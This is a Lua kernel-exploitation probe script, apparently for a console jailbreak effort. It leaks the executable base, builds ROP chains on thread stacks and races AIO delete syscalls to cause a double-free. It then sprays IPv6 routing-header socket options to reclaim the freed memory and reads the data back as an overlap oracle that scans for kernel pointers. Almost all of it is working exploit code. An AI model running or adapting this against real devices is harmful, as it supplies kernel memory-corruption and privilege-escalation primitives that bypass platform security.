-- CRASH_CLASS: MODERATE
-- PROBE 75c: Double-free + RTHDR zone-128 spray + overlap oracle
--
-- Combines three confirmed primitives:
--   1. AIO double-free race (65l: ~13.5% per ID)
--   2. IPV6_RTHDR sticky option at optlen=120 → zone 128 (75b: TAG-OK)
--   3. getsockopt readback oracle (75b/76a: tag roundtrips)
--
-- Sequence:
--   [A] Setup (eboot, gadgets, signals)
--   [B] Pre-create 300 IPv6 UDP sockets (fd allocation only)
--   [C] Submit 48 AIO requests → poll → cancel (all before any delete)
--   [D] Race delete: 3 × 16 IDs, two child threads per batch
--   [E] Spray RTHDR 120B on all 300 sockets (zone 128 = m_aio_reqs2 bucket)
--   [F] Oracle: getsockopt readback, detect tag cross-contamination
--   [G] Hexdump + kernel pointer scan on overlapping readbacks

print("=== PROBE 75c: zone-128 spray oracle ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wb(a, v) memory.write_byte(a, v) end
local function rb(a) return N(memory.read_byte(a)) end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a) return N(memory.read_dword(a)) end
local function wq(a, v) memory.write_qword(a, v) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local sc = {
    socket = mk(97), setsock = mk(105), getsock = mk(118),
    close = mk(6), open = mk(5), sigact = mk(416),
    thr_new = mk(455), info = mk(593),
    aio_sub = mk(669), aio_poll = mk(664),
    aio_can = mk(666), aio_del = mk(662),
}

local function call(s, ...)
    local ok, val = pcall(s, ...)
    if not ok then return -999 end
    local l = N(val)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

-- =========================================================
-- [A] SETUP
-- =========================================================

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() sc.info(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt_q(eb))

local g = {
    pop_rax   = eb + 0x992,
    pop_rdi   = eb + 0xC9DFE,
    pop_rsi   = eb + 0xD77D,
    pop_rdx   = eb + 0x3B02D7,
    bare_ret  = eb + 0x42,
    mov_m_rax = eb + 0x92C67,
}

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
for _, sig in ipairs({11, 12, 13}) do
    pcall(function() sc.sigact(uint64(sig), sa_buf, uint64(0)) end)
end

local fd_zero
do
    local p = memory.alloc(16)
    local s = "/dev/zero"
    for i = 1, #s do wb(N(p) + i - 1, string.byte(s, i)) end
    wb(N(p) + #s, 0)
    fd_zero = call(sc.open, p, uint64(0), uint64(0))
end
print("fd_zero=" .. fd_zero)

-- =========================================================
-- [B] PRE-CREATE SPRAY SOCKETS
-- =========================================================
local SPRAY_N = 300
local spray_fds = {}
for i = 1, SPRAY_N do
    local fd = call(sc.socket, uint64(28), uint64(2), uint64(17))
    if fd >= 0 then spray_fds[#spray_fds + 1] = {fd = fd, idx = i}
    else break end
end
print("spray_sockets=" .. #spray_fds)
if not alive() then print("DEAD after socket creation"); return end

-- =========================================================
-- [C] AIO: SUBMIT ALL → POLL ALL → CANCEL ALL
-- =========================================================
print("")
print("[C] AIO submit/poll/cancel")

local BATCH = 16
local ITERS = 3
local reqs_b = memory.alloc(0x30)
local dbuf = memory.alloc(0x4000)
local rbuf_a = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf_a)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        sc.aio_sub(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() sc.aio_poll(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end
local function cancel_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() sc.aio_can(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
end

local all_ids = {}
for i = 1, BATCH * ITERS do
    if not alive() then break end
    local id = submit_one()
    if id ~= 0 then all_ids[#all_ids + 1] = id end
end
print("  submitted=" .. #all_ids)

for _, id in ipairs(all_ids) do poll_one(id) end
for _, id in ipairs(all_ids) do cancel_one(id) end
print("  polled + canceled")

if #all_ids < BATCH then
    print("  TOO FEW IDs")
    for _, e in ipairs(spray_fds) do pcall(function() sc.close(uint64(e.fd)) end) end
    print("=== 75c DONE ==="); return
end

-- =========================================================
-- [D] RACE DELETE (done-marker sync after 662)
-- =========================================================
print("")
print("[D] Race delete (" .. ITERS .. "x" .. BATCH .. ")")

local del_ids = memory.alloc(4 * BATCH + 0x10)
local sts_A   = memory.alloc(4 * BATCH + 0x10)
local sts_B   = memory.alloc(4 * BATCH + 0x10)
local total_doubles = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD iter=" .. iter); break end
    local si = (iter - 1) * BATCH + 1
    local cnt = math.min(BATCH, #all_ids - si + 1)
    if cnt < 1 then break end

    for i = 0, cnt - 1 do
        wd(N(del_ids) + i * 4, all_ids[si + i])
        wd(N(sts_A) + i * 4, 0xAA)
        wd(N(sts_B) + i * 4, 0xBB)
    end

    local mk_A = memory.alloc(8); wq(N(mk_A), uint64(0))
    local mk_B = memory.alloc(8); wq(N(mk_B), uint64(0))

    -- Child A: 662 → done marker 0xD0 → thr_exit
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g.pop_rdi); emA(uint64(N(del_ids)))
    emA(g.pop_rsi); emA(uint64(cnt))
    emA(g.pop_rdx); emA(uint64(N(sts_A)))
    emA(g.pop_rax); emA(uint64(662))
    emA(stub)
    emA(g.pop_rax); emA(uint64(0xD0))
    emA(g.pop_rdi); emA(uint64(N(mk_A)))
    emA(g.mov_m_rax)
    emA(g.pop_rdi); emA(uint64(0))
    emA(g.pop_rax); emA(uint64(431))
    emA(stub)

    -- Child B: 662 → done marker 0xD1 → thr_exit
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g.pop_rdi); emB(uint64(N(del_ids)))
    emB(g.pop_rsi); emB(uint64(cnt))
    emB(g.pop_rdx); emB(uint64(N(sts_B)))
    emB(g.pop_rax); emB(uint64(662))
    emB(stub)
    emB(g.pop_rax); emB(uint64(0xD1))
    emB(g.pop_rdi); emB(uint64(N(mk_B)))
    emB(g.mov_m_rax)
    emB(g.pop_rdi); emB(uint64(0))
    emB(g.pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_param A
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g.bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    -- thr_param B
    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g.bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- Launch both children
    pcall(function() sc.thr_new(par_A, uint64(0x38)) end)
    pcall(function() sc.thr_new(par_B, uint64(0x38)) end)

    -- Wait for done markers (662 completed)
    local synced = false
    for w = 1, 500000 do
        if (rd(N(mk_A)) or 0) == 0xD0 and (rd(N(mk_B)) or 0) == 0xD1 then
            synced = true; break
        end
    end

    local dbl = 0
    for i = 0, cnt - 1 do
        if (rd(N(sts_A) + i * 4) or 0xFF) == 0
           and (rd(N(sts_B) + i * 4) or 0xFF) == 0 then
            dbl = dbl + 1
        end
    end
    total_doubles = total_doubles + dbl
    print(string.format("  iter %d: dbl=%d sync=%s", iter, dbl,
        synced and "OK" or "TIMEOUT"))
end

print("  total_doubles=" .. total_doubles)

if total_doubles < 1 or not alive() then
    print("  NO DOUBLES or DEAD — aborting spray")
    for _, e in ipairs(spray_fds) do pcall(function() sc.close(uint64(e.fd)) end) end
    print("=== 75c DONE ==="); return
end

-- =========================================================
-- [E] SPRAY RTHDR 120B ON ALL PRE-CREATED SOCKETS
-- =========================================================
print("")
print("[E] Spray RTHDR 120B → zone 128")

local OPTLEN = 120
local opt_buf = memory.alloc(OPTLEN + 8)
for i = 0, OPTLEN - 1 do wb(N(opt_buf) + i, 0) end
wb(N(opt_buf), 0)
wb(N(opt_buf) + 1, OPTLEN / 8 - 1)
wb(N(opt_buf) + 2, 0)
wb(N(opt_buf) + 3, (OPTLEN - 8) / 16)

local set_ok = 0
for _, entry in ipairs(spray_fds) do
    wd(N(opt_buf) + 8, 0xCAFE0000 + entry.idx)
    local r = call(sc.setsock, uint64(entry.fd), uint64(41), uint64(51),
                   uint64(N(opt_buf)), uint64(OPTLEN))
    if r == 0 then set_ok = set_ok + 1 end
end
print("  set_ok=" .. set_ok .. "/" .. #spray_fds)

if not alive() then print("DEAD after spray"); return end

-- =========================================================
-- [F] ORACLE: READBACK ALL TAGS
-- =========================================================
print("")
print("[F] Oracle readback")

local read_buf = memory.alloc(OPTLEN + 16)
local read_len = memory.alloc(8)
local overlaps = {}
local own = 0
local garbage = 0

for _, entry in ipairs(spray_fds) do
    if not alive() then break end
    for off = 0, OPTLEN - 1, 4 do wd(N(read_buf) + off, 0xCCCCCCCC) end
    wd(N(read_len), 256)
    local r = call(sc.getsock, uint64(entry.fd), uint64(41), uint64(51),
                   uint64(N(read_buf)), uint64(N(read_len)))
    if r == 0 then
        local tag = rd(N(read_buf) + 8) or 0
        local hi = math.floor(tag / 0x10000)
        local lo = tag % 0x10000
        if hi == 0xCAFE then
            if lo == entry.idx then own = own + 1
            else
                overlaps[#overlaps + 1] = {
                    reader = entry.idx, writer = lo,
                    fd = entry.fd, tag = tag
                }
            end
        else
            garbage = garbage + 1
            if garbage <= 5 then
                print(string.format("  GARBAGE idx=%d tag=%08X", entry.idx, tag))
            end
        end
    end
end

print(string.format("  own=%d garbage=%d OVERLAPS=%d", own, garbage, #overlaps))

-- =========================================================
-- [G] RESULTS
-- =========================================================
if #overlaps > 0 then
    print("")
    print("*** OVERLAP DETECTED — ZONE 128 RECLAIM CONFIRMED ***")
    for j = 1, math.min(10, #overlaps) do
        local o = overlaps[j]
        print(string.format("  socket[%d] reads tag of socket[%d] (0x%08X)",
            o.reader, o.writer, o.tag))
    end

    -- Hexdump first overlap's full readback
    print("")
    print("[G] Hexdump overlap reader=" .. overlaps[1].reader)
    for off = 0, OPTLEN - 1, 4 do wd(N(read_buf) + off, 0) end
    wd(N(read_len), 256)
    pcall(function()
        sc.getsock(uint64(overlaps[1].fd), uint64(41), uint64(51),
                   uint64(N(read_buf)), uint64(N(read_len)))
    end)
    for row = 0, OPTLEN - 1, 16 do
        local hex = ""
        for off = row, math.min(row + 12, OPTLEN - 4), 4 do
            hex = hex .. string.format("%08X ", rd(N(read_buf) + off) or 0)
        end
        print(string.format("  +%02X: %s", row, hex))
    end

    -- Kernel pointer scan
    local kptrs = 0
    for off = 0, OPTLEN - 8, 8 do
        local q = rq(N(read_buf) + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                print(string.format("  *** KPTR +%02X: %s ***", off, fmt_q(q)))
                kptrs = kptrs + 1
            end
        end
    end
    if kptrs == 0 then
        print("  No kernel pointers (expected — RTHDR overwrites freed chunk)")
    end
else
    print("")
    print("NO OVERLAP — spray did not reclaim freed chunks")
    print("Next: try CPU pinning (cpuset_setaffinity) or increase spray count")
end

-- =========================================================
-- [H] CLEANUP
-- =========================================================
print("")
for _, e in ipairs(spray_fds) do pcall(function() sc.close(uint64(e.fd)) end) end
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 75c COMPLETE ===")
